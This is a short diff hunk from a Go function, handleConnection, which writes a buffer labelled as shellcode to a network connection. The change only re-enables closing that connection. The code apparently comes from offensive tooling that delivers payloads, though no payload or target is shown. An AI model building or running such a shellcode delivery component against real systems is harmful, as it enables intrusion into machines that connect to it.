@@ -69,5 +69,5 @@ func handleConnection(conn net.Conn, data []byte) {
 	// Send shellcode
 	conn.Write(final)
 	// Closing connection
-	// conn.Close()
+	conn.Close()
 }
